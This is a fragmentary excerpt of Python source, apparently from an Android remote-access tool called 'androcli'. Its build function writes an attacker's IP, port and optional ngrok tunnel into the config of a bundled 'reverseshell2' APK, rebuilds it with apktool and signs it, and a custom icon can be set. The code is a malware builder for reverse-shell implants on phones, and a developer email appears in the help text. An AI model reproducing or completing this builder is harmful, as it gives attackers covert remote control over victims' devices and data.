...
def help():
    helper="""
    Usage:
    developer(E-mail)          --> whitedevil367467@gmail.com
...
def build(ip,port,output,ngrok=False,ng=None,icon=None):
    ...
    package_dir = pkg_resources.resource_filename('androcli', '')
    editor = package_dir+direc+"Compiled_apk"+direc+"smali"+direc+"com"+direc+"example"+direc+"reverseshell2"+direc+"config.smali"
    try:
    ...
    que = queue.Queue()
    apktool_jar = package_dir+direc+"Jar_utils"+direc+"apktool.jar"
    compiled_apk = package_dir+direc+"Compiled_apk"
    t = threading.Thread(target=executeCMD,args=["java -jar "+apktool_jar+" b "+compiled_apk+"  -o "+outFileName,que],)
    t.start()
    ...
    if not resOut.returncode:
        ...
        sign_jar = package_dir+direc+"Jar_utils"+direc+"sign.jar"
        t = threading.Thread(target=executeCMD,args=["java -jar "+sign_jar+" -a "+outFileName+" --overwrite",que],)
        t.start()
